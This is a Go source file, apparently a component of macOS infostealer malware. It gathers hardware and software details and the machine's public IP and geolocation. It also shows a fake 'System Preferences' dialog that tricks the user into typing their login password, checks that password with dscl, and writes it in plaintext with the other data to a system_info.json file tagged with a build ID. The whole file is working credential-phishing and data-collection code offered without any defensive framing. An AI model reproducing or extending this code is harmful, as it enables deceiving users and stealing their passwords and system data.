package extraction

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

type ipAPIResponse map[string]interface{}

type ipifyResponse struct {
	IP string `json:"ip"`
}

func GetIPInfo() (map[string]interface{}, error) {
	geoInfo := make(map[string]interface{})

	geoResp, err := http.Get("https://freeipapi.com/api/json/")
	if err != nil {
		return nil, fmt.Errorf("failed to fetch geo IP info: %w", err)
	}
	defer geoResp.Body.Close()

	if geoResp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("geo IP API request failed with status: %s", geoResp.Status)
	}

	bodyGeo, err := io.ReadAll(geoResp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read geo IP response body: %w", err)
	}
	if len(bodyGeo) == 0 {
		return nil, fmt.Errorf("received empty response from geo IP API")
	}

	err = json.Unmarshal(bodyGeo, &geoInfo)
	if err != nil {
		return nil, fmt.Errorf("failed to parse geo IP JSON: %w", err)
	}

	ipResp, err := http.Get("https://api.ipify.org/?format=json")
	if err != nil {

		fmt.Printf("Warning: failed to fetch public IP: %v\n", err)
		return geoInfo, nil
	}
	defer ipResp.Body.Close()

	if ipResp.StatusCode != http.StatusOK {
		fmt.Printf("Warning: public IP API request failed with status: %s\n", ipResp.Status)
		return geoInfo, nil
	}

	bodyIP, err := io.ReadAll(ipResp.Body)
	if err != nil {
		fmt.Printf("Warning: failed to read public IP response body: %v\n", err)
		return geoInfo, nil
	}

	var publicIPInfo ipifyResponse
	err = json.Unmarshal(bodyIP, &publicIPInfo)
	if err != nil {
		fmt.Printf("Warning: failed to parse public IP JSON: %v\n", err)
	} else if publicIPInfo.IP != "" {
		geoInfo["ipAddress"] = publicIPInfo.IP
	}

	return geoInfo, nil
}

func runCommand(command string, args ...string) (string, error) {
	cmd := exec.Command(command, args...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf("command failed: %s %v - %s: %w", command, args, stderr.String(), err)
	}
	return out.String(), nil
}

func getMacOSPasswordViaAppleScript() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("failed to get current user: %w", err)
	}
	username := currentUser.Username

	const maxAttempts = 5
	const dialogText = "To launch the application, you need to update the system settings \n\nPlease enter your password."
	const dialogTitle = "System Preferences"

	appleScript := fmt.Sprintf(`display dialog "%s" with title "%s" with icon caution default answer "" giving up after 30 with hidden answer`, dialogText, dialogTitle)

	fmt.Println("Requesting user password via AppleScript dialog...")

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		fmt.Printf("Password prompt attempt %d/%d\n", attempt, maxAttempts)
		dialogResult, err := runCommand("osascript", "-e", appleScript)

		if err != nil {
			if strings.Contains(err.Error(), "User cancelled") || strings.Contains(dialogResult, "User cancelled") {
				fmt.Println("User cancelled password dialog.")
				return "", fmt.Errorf("user cancelled password entry")
			}
			if strings.Contains(err.Error(), "gave up:true") || strings.Contains(dialogResult, "gave up:true") {
				fmt.Println("Password dialog timed out.")
				continue
			}
			fmt.Printf("AppleScript execution error (attempt %d): %v\nOutput: %s\n", attempt, err, dialogResult)
			time.Sleep(1 * time.Second)
			continue
		}

		password := ""
		startKey := "text returned:"
		startIndex := strings.Index(dialogResult, startKey)

		if startIndex != -1 {
			startIndex += len(startKey)
			endIndex := strings.Index(dialogResult[startIndex:], ", gave up:")
			if endIndex != -1 {
				password = strings.TrimSpace(dialogResult[startIndex : startIndex+endIndex])
			} else {
				password = strings.TrimSpace(dialogResult[startIndex:])
			}
		} else {
			fmt.Printf("Could not parse password from dialog output (attempt %d): %s\n", attempt, dialogResult)
			time.Sleep(1 * time.Second)
			continue
		}

		if password != "" {
			fmt.Println("Verifying entered password...")
			isValid, verifyErr := VerifyPassword(username, password)
			if verifyErr != nil {
				fmt.Printf("Error verifying password (attempt %d): %v\n", attempt, verifyErr)
				time.Sleep(1 * time.Second)
				continue
			}
			if isValid {
				fmt.Println("Password verified successfully.")
				return password, nil
			} else {
				fmt.Println("Password verification failed. Please try again.")
			}
		} else {
			fmt.Println("No password extracted from dialog. Please try again.")
		}
	}

	return "", fmt.Errorf("failed to obtain valid password after %d attempts", maxAttempts)
}

func CollectSystemInfo(buildID string, outputPath string) error {
	fmt.Println("Collecting system information...")
	systemInfo := make(map[string]interface{})

	profileData, err := runCommand("system_profiler", "SPSoftwareDataType", "SPHardwareDataType")
	if err != nil {
		fmt.Printf("Warning: failed to run system_profiler: %v\n", err)
		systemInfo["profiler_error"] = err.Error()
	} else {

		lines := strings.Split(profileData, "\n")
		for _, line := range lines {
			trimmedLine := strings.TrimSpace(line)
			if len(trimmedLine) == 0 {
				continue
			}
			if !strings.Contains(trimmedLine, ":") && !strings.HasPrefix(trimmedLine, " ") {
				continue
			}
			delimiterPos := strings.Index(trimmedLine, ":")
			if delimiterPos != -1 {
				key := strings.TrimSpace(trimmedLine[:delimiterPos])
				value := ""
				if delimiterPos+1 < len(trimmedLine) {
					value = strings.TrimSpace(trimmedLine[delimiterPos+1:])
				}
				if key != "" && value != "" {
					systemInfo[key] = value
				}
			}
		}
	}

	ipInfo, err := GetIPInfo()
	if err != nil {
		fmt.Printf("Warning: failed to get IP info: %v\n", err)
		systemInfo["ip_info"] = map[string]string{"error": err.Error()}
	} else {
		systemInfo["ip_info"] = ipInfo
	}

	macPassword, passErr := getMacOSPasswordViaAppleScript()
	if passErr != nil {
		fmt.Printf("Warning: could not obtain macOS password: %v\n", passErr)
		systemInfo["system_password_error"] = passErr.Error()
	} else {
		systemInfo["system_password"] = macPassword
	}

	systemInfo["BUILD_ID"] = buildID
	systemInfo["system_os"] = "macos"

	systemOutputPath := filepath.Join(outputPath, "System")
	if err := os.MkdirAll(systemOutputPath, 0755); err != nil {
		return fmt.Errorf("failed to create system output directory %s: %w", systemOutputPath, err)
	}

	filePath := filepath.Join(systemOutputPath, "system_info.json")
	jsonData, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal system info to JSON: %w", err)
	}

	err = os.WriteFile(filePath, jsonData, 0644)
	if err != nil {
		return fmt.Errorf("failed to write system info to %s: %w", filePath, err)
	}

	fmt.Println("System info written to:", filePath)
	return nil
}

func ExecuteAppleScript(script string) (string, error) {
	cmd := exec.Command("osascript", "-e", script)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return out.String(), fmt.Errorf("applescript execution failed: %s: %w", stderr.String(), err)
	}
	return out.String(), nil
}

func VerifyPassword(username, password string) (bool, error) {
	if username == "" || password == "" {
		return false, fmt.Errorf("username and password cannot be empty")
	}

	cmd := exec.Command("dscl", "/Local/Default", "-authonly", username, password)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	err := cmd.Run()

	if err == nil {
		return true, nil
	}

	if exitErr, ok := err.(*exec.ExitError); ok {
		fmt.Printf("dscl auth failed (Stderr: %s): %v\n", stderr.String(), exitErr)
		return false, nil
	}

	return false, fmt.Errorf("failed to run dscl command: %s: %w", stderr.String(), err)
}
